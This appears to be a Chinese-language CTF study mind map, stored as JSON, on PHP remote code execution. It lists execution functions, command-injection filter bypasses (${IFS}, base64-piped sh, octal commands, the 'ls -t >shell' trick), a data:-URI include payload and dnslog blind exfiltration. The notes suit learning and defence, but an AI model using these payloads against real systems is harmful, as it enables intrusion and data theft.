{"nodeData":{"id":"7d9b007c1a9ae72d","topic":"RCE","root":true,"children":[{"topic":"执行","id":"8649772112ada50a","children":[{"topic":"命令执行(脚本调用操作系统命令)","id":"86496aa935651b2d","children":[{"topic":"system()","id":"8649ecbd87c6c614"},{"topic":"exec()","id":"8649ed0711458390","children":[{"topic":"回显末行","id":"864a74a611f4967b"}]},{"topic":"shell_exec()----无回显","id":"864a731aa478d63d"},{"topic":"passthru","id":"864a737c18051c65"}]},{"topic":"代码执行(引用脚本代码解析执行)","id":"7d9b466ae72a75cd","children":[{"topic":"eval()","id":"8649e9441c557ef5"},{"topic":"assert()","id":"8649ea20934aa093"},{"topic":"${}特殊组合------需被双引号包裹","id":"8649f94da3364202"}]},{"topic":"函数执行","id":"86496887da6623f0","children":[{"topic":"回调函数","id":"8649f67b2357228b","children":[{"topic":"array_map('assert'.array($_REQUEST[8]))","id":"8649fb6f1e88d7fb"},{"topic":"call_user_func(回调函数,参数)","id":"8649fb9a937edffb"}]},{"topic":"creat_function匿名函数","id":"8649f99d9075f0c0","children":[{"topic":"$newfunc = create_function('$v', 'return system($v);');\n$newfunc('whoami');","id":"86e70e665add409b"}]},{"topic":"preg_replace的/e参数(php<5.3)","id":"864a0b0c24017cf3","children":[{"topic":"echo preg_replace('/chabug/e','phpinfo()','asdasdchabugasd');","id":"864a558d2ee8a713"}]}]}],"direction":0},{"topic":"bypass","id":"864986c923529d06","children":[{"topic":"读取命令绕过(适用于linux)","id":"864988989b165e55","children":[{"topic":"cat,tac","id":"864a860513b80794"},{"topic":"xxd(16进制读取)","id":"864a87519d98251f"},{"topic":"vim(需要服务器安装vim)","id":"864a877e1865af8c"},{"topic":"strings flag","id":"864a87d1140b59a3"},{"topic":"uniq","id":"864a87efa53822b2"},{"topic":"rev flag(结果会反)","id":"864a8c4e1b68b6d4"},{"topic":"curl file:///root/f/flag","id":"864a8c791f337d42"},{"topic":"more","id":"864a92002ef63355"},{"topic":"less","id":"864a922e9eaeb9de"},{"topic":"head","id":"864a9653a1713d42"},{"topic":"tail","id":"864a97811bb92a59"},{"topic":"nl (标注行号)","id":"864a980dab83b2cc"},{"topic":"bash -v flag","id":"864b35753b4f2c29"}]},{"topic":"空格过滤","id":"864b2cc62426b6a8","children":[{"topic":"%09(url传递)","id":"864b7d9db67eecf2","children":[{"topic":"cat%09flag.php","id":"864b80462e1b2526"}]},{"topic":"cat${IFS}flag","id":"864b88debb68e6a6"},{"topic":"{cat,flag}","id":"864b891a2fe72315"},{"topic":"<","id":"864b893ccdd36732"},{"topic":"$IFS$9","id":"864b8964a342d482"},{"topic":"$IFS","id":"864b8c573d98cd06"},{"topic":"tab","id":"86ecfab4a1f893f9"}]},{"topic":"分号;替代","id":"864b912d2ef1a936","children":[{"topic":"%0a （换行符）或  %0d （回车符）(%0d未成功)：通过换行分隔命令。","id":"864b9251392e38ff"}]},{"topic":"目录符/过滤","id":"864b9ad99176c633","children":[{"topic":"使用    ;     一步一步执行","id":"864c2bf0c084c8c0","children":[{"topic":"cd xxx;","id":"864c2d0eb3a6f7b8"}]},{"topic":"使用8进制编码\"/\"\n\n“/“的八进制编码为\\57，使用$(printf${IFS}”\\57”)内敛执行输出“/”到字符串中","id":"864c2c593f5f459d"},{"topic":"使用${HOME:0:1}代替/","id":"864c8656c7823656"},{"topic":"chr(47)","id":"864c87fb3c78d550"}]},{"topic":"绕过flag","id":"864c89b2c7847af8","children":[{"topic":"内联tac$IFS`ls`","id":"864c8ccb375a1659"},{"topic":"echo Y2F0IGZsYWcucGhw|base64 -d|sh","id":"864c8d7d4fc72dde"}]},{"topic":"无字母命令执行(bash)","id":"864c90e73da349ea","children":[{"topic":"使用\n\n$'\\154\\163'\n\n会执行ls\n\n故payload是\n\n/?c=$'\\143\\141\\164'%20*","id":"864c9192c449ea4c"}]},{"topic":"组合绝活(ctf)","id":"864d119a4718aff7","children":[{"topic":"touch \"ag\"","id":"864d17693bcabf3f"},{"topic":"touch \"fl\\\\\"","id":"864d17c546f6d87c"},{"topic":"touch \"t \\\\\"","id":"864d17f4bee78427"},{"topic":"touch \"ca\\\\\"","id":"864d18363e3985ec"},{"topic":"ls -t >shell","id":"864d1869c3164c87"},{"topic":"sh shell","id":"864d1cdcc96085c8"},{"topic":"\\指换行,ls -t是指将文本按时间输出,ls-t>shell将输出输入到shell文件,sh将文本中的文字读取出来执行","id":"864d1de6b1a76657"}]},{"topic":"异或无符号(过滤'/[a-z0-9]/i')","id":"864d11cac317fbd1"},{"topic":"空变量$*和$@,$s,${s}","id":"864d2296c471e050","children":[{"topic":"c$*at flag4.txt","id":"8c32b8e4f2eec313"}]},{"topic":"拼接法a=fl;b=ag;cat $a$b","id":"864d22153de5900a"},{"topic":"转义符/   \\   '  \"\"","id":"864d2d96c83e6b03","children":[{"topic":"l\\s l\"\"s","id":"864d2eb946888a15"}]},{"topic":"编码绕过--echo ''flag|base64,cat `echo (编码) |base64 -d`","id":"864d2f3cb01fc8fd"},{"topic":"$(...) 是Shell中的命令替换语法。它会先执行括号内的命令，然后将输出（标准输出）捕获并替换到当前位置。echo $(tac fl0g.php)","id":"864d30f9ce87f5b0"},{"topic":"高级绕过","id":"7d9b0240fe259fc2","direction":0,"children":[{"topic":"通过常量+魔术常量泄露信息","id":"7d9b1ab374be6e10","children":[{"topic":"__LINE__()","id":"7d9b1c75f1b9580e","children":[{"topic":"效果​：因 __LINE__ 是常量，会报错并暴露当前行号。​技巧​：所有 PHP魔术常量 (__FILE__, __DIR__等) 均可触发错误泄露路径信息","id":"7d9b252af1139228"}]}]},{"topic":"利用语法错误泄露路径","id":"7d9b287ff03b4e81","children":[{"topic":"任意无效字符 如： { } [ ]","id":"7d9b28f1795944f0"},{"topic":"array_sum","id":"7d9b2f71fa9fb2c7","children":[{"topic":"Warning: array_sum() expects exactly 1 parameter, 0 given in /path/to/vuln.php on line X","id":"7d9b2fd6e82348f7"}]}]},{"topic":"通过类方法调用","id":"7d9b32c4f17c1647","children":[{"topic":"ClassName::method","id":"7d9b331c008b1d33"}]},{"topic":"include() 接受无参数调用，默认包含 $_GET['_']","id":"7d9bf23666713f23","children":[{"topic":"/vuln.php?input=include&_=data:text/plain,<?php system('id');?>","id":"7d9bf3ea816b2b60"}]},{"topic":"无参数RCE漏洞利用","id":"7d9cf250033b5428","children":[{"topic":"getallheaders","id":"7d9cf3f618818615"},{"topic":"new node","id":"7d9cf43b0738ac19"},{"topic":"new node","id":"7d9cf4761e413fa3"},{"topic":"new node","id":"7d9d159580a22413"},{"topic":"www.cnblogs.com/pursue-security/p/15406272.html","id":"7d9d16868116155f"}]}]},{"topic":"tar -czf index","id":"8781f0428121415b"}],"direction":1},{"topic":"命令连接符","id":"86498d35267c073c","children":[{"topic":"; \n分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。","id":"864997cb46e75a97"},{"topic":"||\n\n逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。","id":"8649983c17088e6f"},{"topic":"&&\n\n逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。","id":"8649986ca38f1884"},{"topic":"&按位与，不论前面的是否执行成功都执行后面的","id":"86499f5d201e5e89"},{"topic":"|\n\n管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。","id":"86499fe8a6f25fea"}],"direction":0},{"topic":"无回显","id":"864d35adcc055aa5","direction":1,"children":[{"topic":"正向","id":"864d3772409aec64","children":[{"topic":"写进文件,然后访问","id":"864d39a83ac260a6"}]},{"topic":"反向","id":"864d38724975e02b","children":[{"topic":"对外访问(ping dnslog)","id":"864d3aae40c68cc6"}]}]}]},"linkData":{},"direction":2}